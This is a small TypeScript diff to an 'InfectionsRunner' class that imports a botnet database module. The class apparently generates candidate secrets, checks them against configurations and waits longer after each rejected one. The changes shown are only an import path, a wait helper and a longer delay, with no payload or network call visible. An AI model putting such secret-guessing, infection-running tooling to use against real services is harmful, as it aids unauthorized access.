@@ -1,4 +1,4 @@
-import { createSecret } from "./createSecret/index.ts";
+import { createSecret } from "./createSecret/_index.ts";
 import { CheckConfig } from "./checkConfig/index.ts";
 import { Config } from "../../types/global.d.ts";
 import { BotNetDataBase } from './../../database/index.ts';
@@ -7,6 +7,9 @@ export class InfectionsRunner {
     private createSecret = createSecret;
     private async checkConfig(secret: string): Promise<Config> {
         return await new CheckConfig(secret).run();
+    }
+    private async wait(ms: number) {
+        return await new Promise((resolve) => setTimeout(resolve, ms));
     }
 
     public async run() {
@@ -29,7 +32,8 @@ export class InfectionsRunner {
             const config = await this.checkConfig(secret);
             if (!config) {
                 console.log(`\x1b[33m[!]\x1b[0m Rejected secret: ${secret}`);
-                await new Promise((resolve) => setTimeout(resolve, 1000));
+                console.log(`\x1b[33m[!]\x1b[0m Waiting...`);
+                await this.wait(10000);
                 onThread();
                 return;
             }
